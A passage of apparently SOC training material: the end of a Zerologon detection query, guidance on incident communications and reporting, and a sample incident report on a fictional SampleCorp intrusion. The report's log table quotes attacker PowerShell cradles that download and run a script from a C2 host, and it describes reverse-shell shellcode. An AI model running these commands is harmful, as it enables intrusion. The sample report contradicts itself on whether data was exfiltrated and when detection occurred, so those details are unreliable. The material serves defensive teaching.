| where operation == "NetrServerReqChallenge" OR operation == "NetrServerAuthenticate3" OR operation == "NetrServerPasswordSet2"
| stats count values(operation) as operation_values dc(operation) as unique_operations by _time, id.orig_h, id.resp_h
| where unique_operations >= 2 AND count>100
```

**Query Breakdown**

1. **Data Source Selection**:
  - `index="zerologon"`: Focuses on events within the "zerologon" index, which is set up to capture Zerologon-related network activity.
  - `endpoint="netlogon"`: Filters events specific to the Netlogon endpoint, as Zerologon exploits this protocol.
  - `sourcetype="bro:dce_rpc:json"`: Targets Zeek logs specifically formatted as DCE-RPC (Distributed Computing Environment/Remote Procedure Call), which logs Netlogon traffic.
2. **Time Binning**:
  - `| bin _time span=1m`: Organizes events into one-minute intervals. This helps detect patterns within a short time frame, as Zerologon attacks typically occur within seconds.
3. **Filtering for Key Operations**:
  - `| where operation == "NetrServerReqChallenge" OR operation == "NetrServerAuthenticate3" OR operation == "NetrServerPasswordSet2"`: This filter focuses on key operations associated with the Zerologon attack:
    - `NetrServerReqChallenge`: Used to initiate the challenge-response in the authentication sequence.
    - `NetrServerAuthenticate3`: Used to authenticate a client with the server.
    - `NetrServerPasswordSet2`: Used to change a machine’s password on the domain, which is exploited in Zerologon.
4. **Statistical Analysis**:
  - `| stats count values(operation) as operation_values dc(operation) as unique_operations by _time, id.orig_h, id.resp_h`: Aggregates events by time, source IP (`id.orig_h`), and destination IP (`id.resp_h`). It calculates:
    - `count`: Total number of occurrences of the specified operations.
    - `values(operation) as operation_values`: Lists unique operations for the given combination of source, destination, and time.
    - `dc(operation) as unique_operations`: Counts distinct operations performed, which helps ensure there are multiple types of operations.
5. **Filtering for Anomalous Patterns**:
  - `| where unique_operations >= 2 AND count>100`: Flags activity where:
    - Two or more unique operations are observed (indicating an unusual sequence related to Zerologon).
    - The total count exceeds 100, which suggests a potential brute force or abuse attempt, as typical Netlogon traffic would not involve such a high count in a brief period.

**14. Security Incident Reporting**

#### **Communications**

Effective communication is indispensable during a crisis, particularly a security incident. Transparent, coordinated, and well-structured communication supports trust-building, regulatory compliance, and efficient response efforts.

**Importance of Effective Communications**

The value of clear communication during an incident can be categorized into key areas:

**Stakeholder Trust**

Transparent communication fosters stakeholder trust. By communicating promptly and clearly, an organization demonstrates responsibility, transparency, and control over the incident.

**Coordination & Efficiency**

A cybersecurity incident impacts more than just the technical team; it has broader implications across the organization. Coordinated communication ensures alignment among all parties, enhancing the speed and effectiveness of the response.

**Regulatory Compliance**

Verify compliance mandates specific to your organization, which should be documented in the Incident Response Plan (IRP). Regulatory guidelines often dictate how, when, and what must be communicated to comply with legal requirements.

**Internal Communications**

Internal communications are crucial for a cohesive and consistent message across the organization. This is particularly important to avoid leaks and misinformation. Key elements of internal communications include:

- **Immediate Notification**: Promptly inform all relevant stakeholders upon identifying the incident.
- **Regular Updates**: Share consistent updates with involved teams, covering incident status, potential impacts, and pending actions.
- **Feedback Loop**: Establish a feedback channel for teams to share insights, concerns, and suggestions.

**External Communications**

External communications should be planned carefully, as they often encompass diverse third parties, from customers to regulators. Important considerations include:

- **Affected Parties**: Directly communicate with affected individuals or entities, such as customers, clients, or partners.
- **Public Statement**: For large-scale incidents, consider issuing a public statement that is clear and avoids technical jargon to ensure accessibility.
- **Regulatory Bodies**: Notify regulatory entities, like the Information Commissioner’s Office (ICO), if required by jurisdiction or law, within specified timeframes.

**Navigating Communication Channels During Cybersecurity Incidents**

Effective communication during a cybersecurity incident requires secure, compliant channels. Here’s a breakdown of the technical and regulatory considerations for these channels.

**Security Dimensions of Communication Channels**

- **Encryption**: Ensure all communications are secured with end-to-end encryption, especially when discussing sensitive details.
- **Authentication and Authorization**: Protect access to communication channels with strict multi-factor authentication (MFA) to verify identities.
- **Data Integrity**: Use cryptographic hashing to confirm that messages remain unaltered during transmission.
- **Ephemeral Communications**: For highly confidential discussions, consider platforms that delete messages post-reading to reduce the risk of future leaks.
- **Air-Gapped Communications**: If primary communication systems are compromised, use air-gapped systems that are isolated from other networks to maintain security.

**Regulatory Dimensions of Communication Channels**

- **Data Privacy Laws**: Adhere to data privacy regulations, like GDPR, especially when discussing personal data, to ensure compliance.
- **Breach Notification Mandates**: Follow jurisdiction-specific timelines and content guidelines for notifying stakeholders about data breaches.
- **Record-Keeping**: Balance ephemeral messaging with record-keeping requirements, as some regulations mandate retaining incident-related communications.
- **Cross-Border Communications**: Be aware of data sovereignty laws that may impact communication protocols and data storage if the incident involves multiple jurisdictions.
- **Chain of Custody**: Maintain an unbroken chain of custody for all communications if legal proceedings are anticipated, ensuring that evidence remains admissible in court.

**Conclusion**

Effective communication is a critical component of incident response, bridging internal coordination and regulatory requirements. By employing secure, well-planned, and compliant communication strategies, organizations can bolster their resilience and respond more effectively to security incidents.

#### **Elements of a Proper Incident Report**

Executive Summary The Executive Summary serves as an accessible entry point for a wide audience, including non-technical stakeholders. This section provides a concise overview, key findings, immediate actions taken, and the impact on stakeholders. Many stakeholders may only read this section, so clarity is essential.

Section Description Incident ID Unique identifier for the incident. Incident Overview Summary of the incident's events (including initial detection) and the type of attack (e.g., ransomware, data breach). Include the estimated time, duration, affected systems/data, and status (ongoing, resolved, or escalated). Key Findings Summary of the root cause and any specific vulnerabilities exploited. Mention data compromised or exfiltrated. Immediate Actions Taken Outline actions taken, such as isolating systems, identifying the root cause, and engaging third-party services. Stakeholder Impact Evaluate impact on customers, employees, proprietary information, and potential financial repercussions. Technical Analysis In-depth breakdown of the technical events during the incident. This section should cover:

Affected Systems & Data List all compromised or potentially accessed systems and data. If data was exfiltrated, specify the amount. Evidence Sources & Analysis Include all evidence analyzed and methodology (e.g., web access logs). Emphasize evidence integrity with hashes where necessary. Indicators of Compromise (IoCs) Provide IoCs (e.g., unusual processes, outbound traffic) for threat hunting or attribution to specific threat actors. Root Cause Analysis Detailed explanation of the vulnerabilities exploited, root causes, and failure points. Technical Timeline Document key events, including:

Reconnaissance Initial Compromise C2 Communications Enumeration, Lateral Movement Data Access & Exfiltration Malware Deployment (Process Injection, Persistence) Containment, Eradication, and Recovery times Nature of the Attack Explanation of the attack type, TTPs (tactics, techniques, and procedures) used by the attacker. Impact Analysis Assess the adverse effects on data, operations, and reputation. This includes quantifying and qualifying damage, business implications (e.g., financial losses), regulatory penalties, and reputational impacts.

Response and Recovery Analysis Immediate Response Actions Revocation of Access Compromised Accounts/Systems Identified: Account of tools and methodology used to identify compromised entities. Timeframe: Precise timestamp of detection and revocation. Method of Revocation: Explanation of revocation methods (e.g., disabling accounts, altering firewall rules). Impact: Prevented further compromise or exfiltration. Containment Strategy Short-term Containment: Isolation of affected systems from the network. Long-term Containment: Strategic measures like segmentation or zero-trust implementation. Effectiveness: Evaluation of containment measures. Eradication Measures Malware Removal Identification: Procedures used to detect malware, including EDR tools or forensic analysis. Removal Techniques: Specific tools or manual methods used. Verification: Steps to ensure complete removal, such as checksum verification. System Patching Vulnerability Identification: Discovery methods for vulnerabilities (e.g., CVEs). Patch Management: Steps for testing, deployment, and verification of patches. Fallback Procedures: Reversion procedures in case of instability. Recovery Steps Data Restoration Backup Validation: Procedures to confirm backup integrity. Restoration Process: Detailed steps for data recovery. Data Integrity Checks: Verification of restored data accuracy. System Validation Security Measures: Ensuring system security through reconfiguration or IDS updates. Operational Checks: Verifying that systems operate as expected. Post-Incident Actions Monitoring Enhanced Monitoring Plans: Detailed plans for future monitoring to detect similar vulnerabilities. Tools and Technologies: Specific tools integrated into the monitoring strategy. Lessons Learned Gap Analysis: Evaluation of failed security measures. Recommendations for Improvement: Actionable steps for strengthening defenses. Future Strategy: Long-term policy, architectural, or training changes. Diagrams Use visuals to simplify the incident's complexities:

Incident Flowchart: Progression of the attack from entry point to network propagation. Affected Systems Map: Network topology highlighting compromised nodes. Attack Vector Diagram: Diagram of the attacker's movement and exploitation path. Appendices Provides additional context, evidence, or technical details. This section serves as the backbone for verification and adds depth to the main report narrative.

Contents might include:

Log Files Network Diagrams (pre- and post-incident) Forensic Evidence (disk images, memory dumps) Code snippets Incident Response Checklist Communication Records Compliance Documentation (NDAs, regulatory forms) Glossary and Acronyms Best Practices Root Cause Analysis: Identify the root cause to prevent recurrence. Community Sharing: Share non-sensitive insights with the security community. Regular Updates: Keep stakeholders informed throughout the incident response. External Review: Engage third-party experts to validate findings. Conclusion An incident report is essential following a security event, providing a thorough analysis of what went wrong, effective responses, and strategies to prevent similar events in the future.

#### Incident Reporting Process

**Overview**

Security incident reporting is vital in today’s tech-dependent landscape to protect organizational assets and respond effectively to threats. This process aids in documenting incidents, learning from past events, and improving future response capabilities.

**Importance**

Incident reporting:

- Connects detection to remediation.
- Creates a lessons-learned repository.
- Informs risk assessment, compliance, and stakeholder awareness.

**Incident Identification & Categorization**

**Key Sources:**

1. **Security Tools**: IDS, IPS, EDR, XDR, SIEM, antivirus, NetFlow data.
2. **Human Observation**: Employees reporting unusual activity.
3. **Third-Party Notifications**: Alerts from partners, vendors, or clients.

**Incident Types:**

- **Malware**: Viruses, ransomware.
- **Phishing**: Attempts to steal sensitive data.
- **DDoS**: Flooding attacks to disrupt services.
- **Unauthorized Access**: Unapproved entry to data/systems.
- **Data Leakage**: Accidental data exposure.
- **Physical Breach**: Unauthorized physical access.

**Severity Levels:**

- **Critical (P1)**: Immediate risk to core functions, requires urgent action.
- **High (P2)**: Significant risk, needs prompt attention.
- **Medium (P3)**: Moderate risk, timely response advised.
- **Low (P4)**: Minor issues, can be managed in routine operations.

**Incident Reporting Process**

1. **Detection & Acknowledgement**: Initial identification, often through automated alerts or observations.
2. **Preliminary Analysis**: Assess scope and potential impact; categorize the incident.
3. **Incident Logging**: Document all details. Use tools like JIRA, TheHive, or basic alternatives.
4. **Notification**:
  - **Internal**: Inform IT, legal, PR, and executive teams.
  - **External**: If needed, notify customers, partners, regulatory bodies, or the public.
5. **Detailed Investigation & Reporting**: Conduct an in-depth analysis of the incident.
6. **Final Report Creation**: Provide a comprehensive report to stakeholders, detailing the incident, its causes, and corrective measures.
7. **Feedback Loop**: Post-incident analysis to improve response preparedness.

#### **Real-world Incident Report**

**Executive Summary**

- `Incident ID`: INC2019-0422-022
- `Incident Severity`: High (P2)
- `Incident Status`: Resolved
- `Incident Overview`: On the night of `April 22, 2019`, at precisely `01:05:00`, SampleCorp's Security Operations Center (SOC) detected unauthorized activity within the internal network, specifically through anomalous process initiation and suspicious-looking PowerShell commands. Leveraging the lack of robust network access controls and two security vulnerabilities, the unauthorized entity successfully gained control over the following nodes within SampleCorp's infrastructure:
  SampleCorp's SOC, in collaboration with the Digital Forensics and Incident Response (DFIR) units, managed to successfully contain the threat, eliminate both the introduced malicious software and existing security gaps, and ultimately restore the compromised systems to their original state.
  - `WKST01.samplecorp.com`: A system used for software development purposes.
  - `HR01.samplecorp.com`: A system used to process employee and partner data.
- `Key Findings`: Owing to insufficient network access controls, the unauthorized entity was assigned an internal IP address by simply connecting their computer to an Ethernet port within a SampleCorp office. Investigative efforts revealed that the unauthorized entity initially compromised `WKST01.samplecorp.com` by exploiting a vulnerable version of `Acrobat Reader`. Additionally, the entity exploited a `buffer overflow vulnerability`, this time in a proprietary application developed by SampleCorp, to further penetrate the internal network. While no widespread data exfiltration was detected, likely owing to the rapid intervention by the SOC and DFIR teams, the unauthorized access to both `WKST01.samplecorp.com` and `HR01.samplecorp.com` raise concerns. As a result, both company and client data should be regarded as potentially compromised to some extent.
- `Immediate Actions`: SampleCorp's SOC and DFIR teams exclusively managed the incident response procedures, without the involvement of any external service providers. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data. This included getting access to network traffic capture files. Additionally, all affected systems were plugged to a host security solution. As for event logs, they were automatically collected by the existing Elastic SIEM solution.
- `Stakeholder Impact`:
  - `Customers`: While no extensive data exfiltration was identified, the unauthorized access to both `WKST01.samplecorp.com` and `HR01.samplecorp.com` raises concerns about the integrity and confidentiality of customer data. As a precautionary measure, some services were temporarily taken offline and some API keys were revoked, leading to brief periods of downtime for customers. The financial implications of this downtime are currently being assessed but could result in loss of revenue and customer trust.
  - `Employees`: The compromised systems included `HR01.samplecorp.com`, which typically houses sensitive employee information. Although we have no evidence to suggest that employee data was specifically targeted or extracted, the potential risk remains. Employees may be subject to identity theft or phishing attacks if their data was compromised.
  - `Business Partners`: Given that `WKST01.samplecorp.com`, a development environment, was among the compromised systems, there's a possibility that proprietary code or technology could have been exposed. This could have ramifications for business partners who rely on the integrity and exclusivity of SampleCorp's technology solutions.
  - `Regulatory Bodies`: The breach of systems, could have compliance implications. Regulatory bodies may impose fines or sanctions on SampleCorp for failing to adequately protect sensitive data, depending on the jurisdiction and the nature of the compromised data.
  - `Internal Teams`: The SOC and DFIR teams were able to contain the threat effectively, but the incident will likely necessitate a review and potential overhaul of current security measures. This could mean a reallocation of resources and budget adjustments, impacting other departments and projects.
  - `Shareholders`: The incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of the remedial actions taken and the company's ability to restore stakeholder confidence.

**Technical Analysis**

**Affected Systems & Data**

Owing to insufficient network access controls, the unauthorized entity was assigned an internal IP address by simply connecting their computer to an Ethernet port within a SampleCorp office.

The unauthorized entity successfully gained control over the following nodes within SampleCorp's infrastructure:

- `WKST01.samplecorp.com`: This is a development environment that contains proprietary source code for upcoming software releases, as well as API keys for third-party services. The unauthorized entity did navigate through various directories, raising concerns about intellectual property theft and potential abuse of API keys.
- `HR01.samplecorp.com`: This is the Human Resources system that houses sensitive employee and partner data, including personal identification information, payroll details, and performance reviews. Our logs indicate that the unauthorized entity did gain access to this system. Most concerning is that an unencrypted database containing employee Social Security numbers and bank account details was accessed. While we have no evidence to suggest data was extracted, the potential risk of identity theft and financial fraud for employees is high.

**Evidence Sources & Analysis**

**[WKST01.samplecorp.com](http://wkst01.samplecorp.com/)**

On the night of `April 22, 2019`, at exactly `01:05:00`, SampleCorp's Security Operations Center (SOC) identified unauthorized activity within the internal network. This was detected through abnormal parent-child process relationships and suspicious PowerShell commands, as displayed in the following screenshot.

From the logs, PowerShell was invoked from `cmd.exe` to execute the contents of a remotely hosted script. The IP address of the remote host was an internal address, `192.168.220.66`, indicating that an unauthorized entity was already present within the internal network.

The earliest signs of malicious command execution point to `WKST01.samplecorp.com` being compromised, likely due to a malicious email attachment with a suspicious file named `cv.pdf` for the following reasons:

- The user accessed the email client `Mozilla Thunderbird`
- A suspicious file `cv.pdf` was opened with Adobe Reader 10.0, which is outdated and vulnerable to security flaws.
- Malicious commands were observed immediately following these events.

Additionally, `cmd.exe` and `powershell.exe` were spawned from `wmiprvse.exe`.

As already mentioned, the unauthorized entity then executed specific PowerShell commands.

**Brief Analysis of 192.168.220.66**

From the logs, we identified four hosts on the network segment with corresponding IP addresses and hostnames. The host `192.168.220.66`, previously observed in the logs of `WKST01.samplecorp.com`, confirms the presence of an unauthorized entity in the internal network.

| **IP** | **Hostname** |
|---|---|
| 192.168.220.20 | [DC01.samplecorp.com](http://dc01.samplecorp.com/) |
| 192.168.220.200 | [WKST01.samplecorp.com](http://wkst01.samplecorp.com/) |
| 192.168.220.101 | [HR01.samplecorp.com](http://hr01.samplecorp.com/) |
| 192.168.220.202 | [ENG01.samplecorp.com](http://eng01.samplecorp.com/) |

The below table is the result of a SIEM query that aimed to identify all instances of command execution initiated from `192.168.220.66`, based on data from `WKST01.samplecorp.com`.

| **event\_data.CommandLine.keyword: Descending** | **beat.hostname.keyword: Descending** | **Count** |
|---|---|---|
| `cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1555864304.02 2>&1` | WKST01 | 5 |
| `cmd.exe /Q /c dir 1> \\\\127.0.0.1\\ADMIN$\\__1555864304.02 2>&1` | WKST01 | 4 |
| `powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX` | WKST01 | 2 |
| `whoami` | WKST01 | 1 |
| `...` | ... | ... |
| `powershell IEX (New-Object Net.WebClient).DownloadString('<http://192.168.220.66/test.php>'); $m = Get-ModifiableService; $m` | HR01 | 1 |

The results suggest that the unauthorized entity has successfully infiltrated the hosts: `WKST01.samplecorp.com` and `HR01.samplecorp.com`.

**[HR01.samplecorp.com](http://hr01.samplecorp.com/)**

`HR01.samplecorp.com` was investigated next, as the unauthorized entity, `192.168.220.66`, was shown to establish a connection with `HR01.samplecorp.com` at the earliest possible moment in the packet capture.

Network traffic details suggest a buffer overflow attempt on the service running at port `31337` of `HR01.samplecorp.com`.

The network traffic was exported as raw binary for further analysis.

The extracted binary was analyzed in a shellcode debugger, `scdbg`.

`Scdbg` reveals that the shellcode will attempt to initiate a connection to `192.168.220.66` at port `4444`. This confirms that there has been an attempt to exploit a service running on port `31337` of `HR01.samplecorp.com`.

A search for network connections between `HR01.samplecorp.com` and the unauthorized entity was conducted using the aforementioned traffic capture file. Results revealed connections back to the unauthorized entity on port `4444`. This indicates that the unauthorized entity successfully exploited a buffer overflow vuln to gain command execution on `HR01.samplecorp.com`.

The depth of the technical analysis can be tailored to ensure that all stakeholders are adequately informed about the incident and the actions taken in response. While we've chosen to keep the investigation details concise in this module to avoid overwhelming you, it's important to note that in a real-world situation, every claim or statement would be backed up with robust evidence.

**Indicators of Compromise (IoCs)**

- `C2 IP`: 192.168.220.66
- `cv.pdf` (SHA256): ef59d7038cfd565fd65bae12588810d5361df938244ebad33b71882dcf683011

**Root Cause Analysis**

Insufficient network access controls allowed the unauthorized entity access to SampleCorp's internal network.

The primary catalysts for the incident were traced back to two significant vulnerabilities. The first vulnerability stemmed from the continued use of an outdated version of Acrobat Reader, while the second was attributed to a buffer overflow issue present within a proprietary application. Compounding these vulnerabilities was the inadequate network segregation of crucial systems, leaving them more exposed and easier targets for potential threats. Additionally, there was a notable gap in user awareness, evident from the absence of comprehensive training against phishing tactics, which could have served as the initial entry point for the attackers.

**Technical Timeline**

- Initial Compromise
  - `April 22nd, 2019, 00:27:27`: One of the employees opened a malicious PDF document (`cv.pdf`) on `WKST01.samplecorp.com`, which exploited a known vulnerability in an outdated version of `Acrobat Reader`. This led to the execution of a malicious payload that established initial foothold on the system.
- Lateral Movement
  - `April 22nd, 2019, 00:50:18`: The unauthorized entity leveraged the initial access to perform reconnaissance on the internal network. They discovered a `buffer overflow` vulnerability in a proprietary HR application running on `HR01.samplecorp.com`. Using a crafted payload, they exploited this vulnerability to gain unauthorized access to the HR system.
- Data Access & Exfiltration
  - `April 22nd, 2019, 00:35:09`: The unauthorized entity accessed various directories on `WKST01.samplecorp.com` containing both proprietary source code and API keys.
  - `April 22nd, 2019, 01:30:12`: The unauthorized entity located an unencrypted database on `HR01.samplecorp.com` containing sensitive employee and partner data, including Social Security numbers and salary information. They compressed this data and exfiltrated it to an external server via a secure `SSH` tunnel.
- C2 Communications
  - An unauthorized entity gained physical access to SampleCorp's internal network. The Command and Control (C2) IP address identified was an internal one: `192.168.220.66`.
- Malware Deployment or Activity
  - The malware was disseminated via a malicious PDF document and made extensive use of legitimate Windows binaries for staging, command execution, and post-exploitation purposes.
  - Subsequently, shellcode was utilized within a buffer overflow payload to infect `HR01.samplecorp.com`.
- Containment Times
  - `April 22nd, 2019, 02:30:11`: SampleCorp's SOC and DFIR teams detected the unauthorized activities and immediately isolated `WKST01.samplecorp.com` and `HR01.samplecorp.com` from the network using VLAN segmentation.
  - `April 22nd, 2019, 03:10:14`: SampleCorp's SOC and DFIR teams plugged a host security solution to both `WKST01.samplecorp.com` and `HR01.samplecorp.com` to collect more data from the affected systems.
  - `April 22nd, 2019, 03:43:34`: The firewall rules were updated to block the known C2 IP address, effectively cutting off the unauthorized entity's remote access.
- Eradication Times
  - `April 22nd, 2019, 04:11:00`: A specialized malware removal tool was used to clean both `WKST01.samplecorp.com` and `HR01.samplecorp.com` of the deployed malware.
  - `April 22nd, 2019, 04:30:00`: All systems, starting with `WKST01.samplecorp.com` were updated to the latest version of `Acrobat Reader`, mitigating the vulnerability that led to the initial compromise.
  - `April 22nd, 2019, 05:01:08`: The API keys that were accessed by the unauthorized entity have been revoked.
  - `April 22nd, 2019, 05:05:08`: The login credentials of the user who accessed the `cv.pdf` file, as well as those of users who have recently signed into both `WKST01.samplecorp.com` and `HR01.samplecorp.com`, have been reset.
- Recovery Times
  - `April 22nd, 2019, 05:21:20`: After ensuring that `WKST01.samplecorp.com` was malware-free, the SOC team restored the system from a verified backup.
  - `April 22nd, 2019, 05:58:50`: After ensuring that `HR01.samplecorp.com` was malware-free, the SOC team restored the system from a verified backup.
  - `April 22nd, 2019, 06:33:44`: The development team rolled out an emergency patch for the `buffer overflow` vulnerability in the proprietary HR application, which was then deployed to `HR01.samplecorp.com`.

**Nature of the Attack**

In this segment, we should meticulously dissect the modus operandi of the unauthorized entity, shedding light on the specific tactics, techniques, and procedures (TTPs) they employed throughout their intrusion. For instance, let's dive into the methods the SOC team used to determine that the unauthorized entity utilized the Metasploit framework in their operations.

**Detecting Metasploit**

To better understand the tactics and techniques of the unauthorized entity, we delved into the malicious PowerShell commands executed.

Particularly, the one shown in the following screenshot.

Upon inspection, it became clear that double encoding was used, likely as a means to bypass detection mechanisms. The SOC team successfully decoded the malicious payload, revealing the exact PowerShell code executed within the memory of `WKST01.samplecorp.com`.

By leveraging open source intelligence, our SOC team determined that this PowerShell code is probably linked to the [Metasploit](https://github.com/rapid7/metasploit-framework) post-exploitation framework.

To support our hypothesis that `Metasploit` was used, we dived deeper into the detected shellcode. We specifically exported the packet bytes containing the shellcode (as `a.bin`) and subsequently submitted them to VirusTotal for evaluation.

The results from VirusTotal affirmed our suspicion that `Metasploit` was in play. Both `metacoder` and `shikata` are intrinsically linked to the Metasploit-generated shellcode.

---

**Impact Analysis**

In this segment, we should dive deeper into the initial stakeholder impact analysis presented at the outset of this report. Given the company's unique internal structure, business landscape, and regulatory obligations, it's crucial to offer a comprehensive evaluation of the incident's implications for every affected party.

---

**Response and Recovery Analysis**

**Immediate Response Actions**

**Revocation of Access**

- `Identification of Compromised Accounts/Systems`: Using Elastic SIEM solution, suspicious activities associated with unauthorized access were flagged on `WKST01.samplecorp.com`. Then, a combination of traffic and log analysis uncovered unauthorized access on `HR01.samplecorp.com` as well.
- `Timeframe`: Unauthorized activities were detected at `April 22, 2019, 01:05:00`. Access was terminated by `April 22nd, 2019, 03:43:34` upon firewall rule update to block the C2 IP address.
- `Method of Revocation`: Alongside the firewall rules, Active Directory policies were applied to force log-off sessions from possibly compromised accounts. Additionally, affected user credentials were reset and accessed API keys were revoked, further inhibiting unauthorized access.
- `Impact`: Immediate revocation of access halted potential lateral movement, preventing further system compromise and data exfiltration attempts.

**Containment Strategy**

- `Short-term Containment`: As part of the initial response, VLAN segmentation was promptly applied, effectively isolating `WKST01.samplecorp.com` and `HR01.samplecorp.com` from the rest of the network, and hindering any lateral movement by the threat actor.
- `Long-term Containment`: The next phase of containment involves a more robust implementation of network segmentation, ensuring specific departments or critical infrastructure run on isolated network segments, and robust network access controls, ensuring that only authorized devices have access to an organization's internal network. Both would reduce the attack surface for future threats.
- `Effectiveness`: The containment strategies were successful in ensuring that the threat actor did not escalate privileges or move to adjacent systems, thus limiting the incident's impact.

**Eradication Measures**

**Malware Removal**

- `Identification`: Suspicious processes were flagged on the compromised systems, and a deep dive forensic examination revealed traces of the `Metasploit` post-exploitation framework, which was further confirmed by `VirusTotal` analysis.
- `Removal Techniques`: Using a specialized malware removal tool, all identified malicious payloads were eradicated from `WKST01.samplecorp.com` and `HR01.samplecorp.com`.
- `Verification`: Post-removal, a secondary scan was initiated, and a heuristic analysis was performed to ensure no remnants of the malware persisted.

**System Patching**

- `Vulnerability Identification`: A vulnerable instance of `Acrobat Reader` was identified, leading to the initial compromise. Cross-referencing with known vulnerabilities pointed towards a potential exploit being used. A `buffer overflow` vulnerability, in a proprietary application developed by SampleCorp was also identified.
- `Patch Management`: All systems, were promptly updated to the latest version of `Acrobat Reader` that addressed the known vulnerability. The development team rolled out an emergency patch for the `buffer overflow` vulnerability in the proprietary HR application, which was then deployed to `HR01.samplecorp.com`. Patching was done in a staged manner, with critical systems prioritized.
- `Fallback Procedures`: System snapshots and configurations were backed up before the patching process, ensuring a swift rollback if the update introduced any system instabilities.

**Recovery Steps**

**Data Restoration**

- `Backup Validation`: Prior to data restoration, backup checksums were cross-verified to ensure the integrity of the backup data.
- `Restoration Process`: The SOC team meticulously restored both affected systems from validated backups.
- `Data Integrity Check`s: Post-restoration, cryptographic hashing using SHA-256 was employed to verify the integrity and authenticity of the restored data.

**System Validation**

- `Security Measures`: The systems' firewalls and intrusion detection systems were updated with the latest threat intelligence feeds, ensuring any indicators of compromise (IoCs) from this incident would trigger instant alerts.
- `Operational Checks`: Before reintroducing systems into the live environment, a battery of operational tests, including load and stress testing, was conducted to confirm the systems' stability and performance.

**Post-Incident Actions**

**Monitoring**

- `Enhanced Monitoring Plans`: The monitoring paradigm has been revamped to include behavioral analytics, focusing on spotting deviations from baseline behaviors which could indicate compromise. In addition, inventory and asset management activities commenced to facilitate the implementation of network access controls.
- `Tools and Technologies`: Leveraging the capabilities of the existing Elastic SIEM, advanced correlation rules will be implemented, specifically designed to detect the tactics, techniques, and procedures (TTPs) identified in this breach.

**Lessons Learned**

- `Gap Analysis`: The incident shed light on certain gaps, primarily around network access controls, email filtering, network segregation, and user training about potential phishing attempts with malicious documents.
- `Recommendations for Improvement`: Initiatives around inventory and asset management, email filtering, and improved security awareness training are prioritized.
- `Future Strategy`: A forward-looking strategy will involve more granular network access controls and network segmentation, adopting a zero-trust security model, and increasing investments in both security awareness training and email filtering.

---

**Annex A**

**Technical Timeline**

| **Time** | **Activity** |
|---|---|
| `April 22nd, 2019, 00:27:27` | One of the employees opened a malicious PDF document (`cv.pdf`) on `WKST01.samplecorp.com`, which exploited a known vulnerability in an outdated version of `Acrobat Reader`. This led to the execution of a malicious payload that established initial foothold on the system. |
| `April 22nd, 2019, 00:35:09` | The unauthorized entity accessed various directories on `WKST01.samplecorp.com` containing both proprietary source code and API keys. |
| `April 22nd, 2019, 00:50:18` | The unauthorized entity leveraged the initial access to perform reconnaissance on the internal network. They discovered a `buffer overflow` vulnerability in a proprietary HR application running on `HR01.samplecorp.com`. Using a crafted payload, they exploited this vulnerability to gain unauthorized access to the HR system. |
| `April 22nd, 2019, 01:30:12` | The unauthorized entity located an unencrypted database on `HR01.samplecorp.com` containing sensitive employee and partner data, including Social Security numbers and salary information. They compressed this data and exfiltrated it to an external server via a secure `SSH` tunnel. |
| `April 22nd, 2019, 02:30:11` | SampleCorp's SOC and DFIR teams detected the unauthorized activities and immediately isolated `WKST01.samplecorp.com` and `HR01.samplecorp.com` from the network using VLAN segmentation. |
| `April 22nd, 2019, 03:10:14` | SampleCorp's SOC and DFIR teams plugged a host security solution to both `WKST01.samplecorp.com` and `HR01.samplecorp.com` to collect more data from the affected systems. |
| `April 22nd, 2019, 03:43:34` | The firewall rules were updated to block the known C2 IP address, effectively cutting off the unauthorized entity's remote access. |
| `April 22nd, 2019, 04:11:00` | A specialized malware removal tool was used to clean both `WKST01.samplecorp.com` and `HR01.samplecorp.com` of the deployed malware. |
| `April 22nd, 2019, 04:30:00` | All systems, starting with `WKST01.samplecorp.com` were updated to the latest version of `Acrobat Reader`, mitigating the vulnerability that led to the initial compromise. |
| `April 22nd, 2019, 05:01:08` | The API keys that were accessed by the unauthorized entity have been revoked. |
| `April 22nd, 2019, 05:05:08` | The login credentials of the user who accessed the `cv.pdf` file, as well as those of users who have recently signed into both `WKST01.samplecorp.com` and `HR01.samplecorp.com`, have been reset. |
| `April 22nd, 2019, 05:21:20` | After ensuring that `WKST01.samplecorp.com` was malware-free, the SOC team restored the system from a verified backup. |
| `April 22nd, 2019, 05:58:50` | After ensuring that `HR01.samplecorp.com` was malware-free, the SOC team restored the system from a verified backup. |
| `April 22nd, 2019, 06:33:44` | The development team rolled out an emergency patch for the `buffer overflow` vulnerability in the proprietary HR application, which was then deployed to `HR01.samplecorp.com`. |

{% endraw %}
